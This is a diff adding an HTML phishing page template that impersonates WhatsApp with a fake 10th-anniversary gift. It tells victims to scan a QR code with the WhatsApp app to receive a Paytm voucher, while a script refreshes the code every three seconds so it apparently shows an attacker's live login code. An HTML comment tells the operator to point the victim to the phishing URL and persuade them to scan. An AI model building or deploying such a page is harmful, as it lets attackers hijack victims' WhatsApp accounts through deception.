@@ -1,0 +1,32 @@
+<html>
+<head>
+<title>{{name}}</title>
+</head>
+<body style="background-color: green;">
+
+<script>
+var myTimer; myTimer = window.setInterval(reloadD,3000);
+function reloadD(){ d = new Date(); document.getElementById('qrcodew').src="tmp.png?h="+d.getTime();}
+</script>
+
+<center>
+	<h1>
+		<b>****Congratualtions****</b>
+	</h1>
+	
+	Whatsapp is now 10 years old and you are a lucky user. So Whatsapp has decided to give you a surprise gift.
+	<br/>
+	</br><h3><b>1. This is your QR Code.</b></h3><br/>
+	
+	</b><img id="qrcodew" alt="Scan me!" src="tmp.png" style="display: block;">
+
+	<br/>
+	
+	<br/><h3><b>2. Scan the qr code using whatsapp mobile application.</b></h3>
+	<br/><h3><b>3. You will get a surprise money voucher on your paytm (registered with this mobile number).</b></h3>
+
+<!--</br>3. Point your victim to your phishing <a href='http://localhost:{{port}}/'>URL</a>, Convince to scan the QR code and Bob is your uncle!-->
+
+</center>
+</body>
+</html>
